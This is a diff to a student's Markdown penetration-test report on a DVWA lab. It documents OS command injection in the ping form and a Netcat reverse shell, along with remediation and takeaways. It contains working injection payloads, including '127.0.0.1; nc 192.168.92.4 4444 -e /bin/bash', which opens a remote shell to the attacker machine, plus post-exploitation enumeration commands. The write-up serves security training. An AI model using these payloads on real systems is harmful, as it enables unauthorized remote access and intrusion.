@@ -1,13 +1,5 @@
 # Reverse Shell via Netcat Using DVWA Command Execution
 
-**Student Name:** Asekun Fatai
-**Student ID:** 2025/INT/12158
-**Course:** Kali Linux Tools and System Security
-**Instructor:** Mr. Aminu Idris
-**Date:** 06 January 2026
-
----
-
 ## 1. Engagement Overview
 
 A controlled penetration test was conducted against the Damn Vulnerable Web
@@ -54,25 +46,25 @@ Netcat as the listener and the DVWA ping form as the injection point.
 
 ## 4. Methodology
 
-### Phase 1 — Reconnaissance
+### Phase 1: Reconnaissance
 DVWA was accessed via Firefox on Kali Linux. The application interface was
 reviewed to identify available vulnerability modules. The Command Execution
 module was selected, which presents a ping input field that passes user-supplied
 input to the underlying operating system.
 
-### Phase 2 — Mapping / Spidering
+### Phase 2: Mapping
 The ping functionality was tested with a legitimate input (`127.0.0.1`) to confirm
 normal behavior and observe the application's response format. The output
 confirmed the application calls the system `ping` command directly and returns
 results to the browser.
 
-### Phase 3 — Vulnerability Identification
+### Phase 3: Vulnerability Identification
 The semicolon character (`;`) was used as a command separator to append
 additional OS commands to the ping input. The `whoami` command was injected
 to confirm whether unsanitized input reached the system shell. Successful
 execution confirmed a command injection vulnerability.
 
-### Phase 4 — Exploitation
+### Phase 4: Exploitation
 A Netcat listener was started on the attacker machine at port `4444` using:
 ```
 nc -lvnp 4444
@@ -81,12 +73,12 @@ A reverse shell payload was then injected into the DVWA ping form, forcing the
 DVWA server to initiate an outbound TCP connection back to the attacker machine.
 The connection was received, establishing an interactive shell session.
 
-### Phase 5 — Validation
+### Phase 5: Validation
 Post-connection commands (`whoami`, `id`, `uname -a`, `pwd`, `ls`) were run
 within the reverse shell to confirm the session context, privilege level, and
 filesystem access. The session ran as `www-data`.
 
-### Phase 6 — Documentation
+### Phase 6: Documentation
 All steps, payloads, terminal output, and screenshots were recorded throughout
 the engagement to support this report.
 
@@ -107,13 +99,13 @@ the engagement to support this report.
 
 ---
 
-### Finding 01 — OS Command Injection
+### Finding 01: OS Command Injection
 
 #### Severity
 Critical
 
 #### Affected Endpoint
-`/dvwa/vulnerabilities/exec/` — Ping input field, `ip` parameter
+`/dvwa/vulnerabilities/exec/`: Ping input field, `ip` parameter
 
 #### Description
 The DVWA Command Execution module accepts user input intended for use as a
@@ -121,7 +113,7 @@ ping target IP address. The application passes this input directly to the operat
 system shell without sanitization or validation. By appending a semicolon (`;`)
 followed by an arbitrary command, an attacker can break out of the intended ping
 context and execute any command available to the web server process. No
-authentication bypass was required — the vulnerability exists within the
+authentication bypass was required, the vulnerability exists within the
 application's core input handling logic.
 
 #### Proof of Concept
@@ -129,7 +121,7 @@ application's core input handling logic.
 DVWA Command Execution page confirming normal ping behavior before
 injection:
 
-![DVWA Command Execution - Normal Ping Output](image.jpg)
+![DVWA Command Execution - Normal Ping Output](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%201/Screenshots/08_01%20DVWA%20Command%20Execution%20-%20Normal%20Ping%20Output.jpg)
 
 Payload injected into the ping input field:
 ```
@@ -144,7 +136,7 @@ the OS shell.
 Any authenticated user with access to the Command Execution module can run
 arbitrary operating system commands under the web server's user context. This
 grants read access to configuration files, credentials stored on the filesystem,
-and the ability to further escalate the attack — as demonstrated by the reverse
+and the ability to further escalate the attack, as demonstrated by the reverse
 shell in Finding 02.
 
 #### Remediation
@@ -152,18 +144,18 @@ shell in Finding 02.
   `>`, `<`, and backticks at the server-side input validation layer
 - Replace direct `exec()` or `shell_exec()` calls with a safe library or API that
   handles ping functionality without invoking a shell (e.g., a PHP ICMP library)
-- Apply a strict input whitelist — for an IP address field, only accept inputs
+- Apply a strict input whitelist for an IP address field, only accept inputs
   matching a valid IPv4 format using regex: `^\d{1,3}(\.\d{1,3}){3}$`
 
 ---
 
-### Finding 02 — Reverse Shell via Command Injection
+### Finding 02: Reverse Shell via Command Injection
 
 #### Severity
 Critical
 
 #### Affected Endpoint
-`/dvwa/vulnerabilities/exec/` — Ping input field, `ip` parameter
+`/dvwa/vulnerabilities/exec/`: Ping input field, `ip` parameter
 
 #### Description
 Building on the confirmed command injection in Finding 01, a Netcat-based
@@ -178,19 +170,19 @@ command-line session on the attacker's Netcat listener.
 
 Netcat listener started on the attacker machine (`192.168.92.4`) at port `4444`:
 
-![Netcat Listener Started - nc -lvnp 4444](image.jpg)
+![Netcat Listener Started - nc -lvnp 4444](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%201/Screenshots/08_02%20Netcat%20Listener%20Started%20-%20nc%20-lvnp%204444.jpg)
 
 Reverse shell payload injected into the DVWA ping field:
 ```
 127.0.0.1; nc 192.168.92.4 4444 -e /bin/bash
 ```
 
-![DVWA Ping Field with Reverse Shell Payload Injected](image.jpg)
+![DVWA Ping Field with Reverse Shell Payload Injected](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%201/Screenshots/08_03%20DVWA%20Ping%20Field%20with%20Reverse%20Shell%20Payload%20Injected.jpg)
 
 Netcat listener receiving the reverse shell connection from `192.168.92.7:38062`
 with confirmed `www-data` session:
 
-![Reverse Shell Connection Received on Netcat](image.jpg)
+![Reverse Shell Connection Received on Netcat](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%201/Screenshots/08_04%20Reverse%20Shell%20Connection%20Received%20on%20Netcat.jpg)
 
 Post-connection validation commands run within the reverse shell:
 ```
@@ -214,30 +206,30 @@ on the target server without needing to repeatedly exploit the injection point.
 From the `www-data` context, the attacker can read application source code and
 database configuration files (including database passwords), browse the entire
 web root, plant additional backdoors, and attempt privilege escalation to root
-using local kernel exploits — the kernel version (`2.6.24`) observed in the `uname`
+using local kernel exploits, the kernel version (`2.6.24`) observed in the `uname`
 output is publicly known to be vulnerable to multiple local privilege escalation
 exploits.
 
 #### Remediation
 - Implement egress network filtering to block unauthorized outbound TCP
-  connections from the web server — the reverse shell succeeded because
+  connections from the web server, the reverse shell succeeded because
   outbound traffic on port `4444` was unrestricted
 - Deploy a host-based intrusion detection system (HIDS) to alert on unexpected
   outbound connections from web service processes
 - Restrict `www-data` from executing binaries such as `nc`, `bash`, and `sh`
   through mandatory access control policies (e.g., AppArmor or SELinux)
-- Address the root cause at the application layer — remediate the command
+- Address the root cause at the application layer remediate the command
   injection vulnerability per Finding 01 to eliminate the injection vector entirely
 
 ---
 
-### Finding 03 — Excessive Web Process Privileges
+### Finding 03: Excessive Web Process Privileges
 
 #### Severity
 High
 
 #### Affected Endpoint
-Server-wide — `www-data` user context
+Server-wide `www-data` user context
 
 #### Description
 The reverse shell session ran as `www-data` with `uid=33`, `gid=33`. While this
@@ -251,7 +243,7 @@ not constrained by any mandatory access control policy.
 Post-exploitation session output confirming `www-data` context and filesystem
 access:
 
-![Post-Exploitation Commands - pwd, ls, ifconfig](image.jpg)
+![Post-Exploitation Commands - pwd, ls, ifconfig](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%201/Screenshots/08_05%20Post-Exploitation%20Commands%20-%20pwd%2C%20ls%2C%20ifconfig.jpg)
 
 Commands confirmed accessible from the shell session:
 ```
@@ -279,7 +271,7 @@ associated with multiple publicly available local root exploits.
 
 ---
 
-### Finding 04 — Missing Egress Network Filtering
+### Finding 04: Missing Egress Network Filtering
 
 #### Severity
 High
@@ -324,39 +316,7 @@ trivially achievable regardless of inbound firewall rules.
 
 ## 7. Attack Chain
 
-```
-[Step 1] Reconnaissance
-DVWA Command Execution module identified
-→ Ping form accepts user input and passes it to OS shell
-        ↓
-[Step 2] Command Injection Confirmed
-Payload: 127.0.0.1; whoami
-→ Application returns both ping output and whoami result
-→ Input is not sanitized — OS command execution confirmed
-        ↓
-[Step 3] Netcat Listener Prepared
-Attacker starts listener on 192.168.92.4:4444
-→ nc -lvnp 4444
-→ Listening on [any] 4444 ...
-        ↓
-[Step 4] Reverse Shell Payload Injected
-Payload: 127.0.0.1; nc 192.168.92.4 4444 -e /bin/bash
-→ DVWA server executes ping, then executes nc
-→ Server initiates outbound TCP to attacker on port 4444
-→ Outbound connection permitted by firewall (no egress filtering)
-        ↓
-[Step 5] Interactive Shell Established
-Attacker receives shell running as www-data
-→ whoami: www-data
-→ uid=33(www-data) gid=33(www-data)
-→ Kernel: Linux 2.6.24-16-server (known vulnerable to local privilege escalation)
-        ↓
-[Step 6] Post-Exploitation
-Filesystem browsed: /var/www/dvwa/vulnerabilities/exec
-Network config retrieved via ifconfig
-OS details retrieved via uname -a and cat /etc/os-release
-→ Full local enumeration achieved from web context
-```
+![Attack Chain](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%201/Screenshots/08_06%20Reverse%20Shell%20Attack%20Chain.jpg)
 
 ---
 
@@ -364,8 +324,8 @@ OS details retrieved via uname -a and cat /etc/os-release
 
 - Kali Linux (attacker environment)
 - Firefox (DVWA access and payload injection)
-- Netcat (`nc -lvnp 4444` — reverse shell listener)
-- DVWA — Damn Vulnerable Web Application (target)
+- Netcat (`nc -lvnp 4444` reverse shell listener)
+- DVWA: Damn Vulnerable Web Application (target)
 
 ---
 
@@ -389,7 +349,7 @@ OS details retrieved via uname -a and cat /etc/os-release
 ## 10. Key Takeaways
 
 - **Input sanitization is the first and most critical control:** The entire attack
-  chain — from basic `whoami` execution to full reverse shell — depended on a
+  chain from basic `whoami` execution to full reverse shell depended on a
   single missing control: server-side input validation. Rejecting shell
   metacharacters at the input layer would have broken the chain at step one.
 - **Reverse shells invert the firewall assumption:** Most firewalls block inbound
@@ -398,7 +358,7 @@ OS details retrieved via uname -a and cat /etc/os-release
   filtering for web servers.
 - **Least privilege limits the damage radius:** The shell ran as `www-data` rather
   than root, which contained the immediate impact. However, the outdated kernel
-  (`2.6.24`) means privilege escalation to root is a realistic next step — patching
+  (`2.6.24`) means privilege escalation to root is a realistic next step, patching
   and mandatory access controls directly reduce this risk.
 - **Command injection is reliably chained:** Command injection alone is
   serious. Chained with Netcat and no egress filtering, it becomes a complete
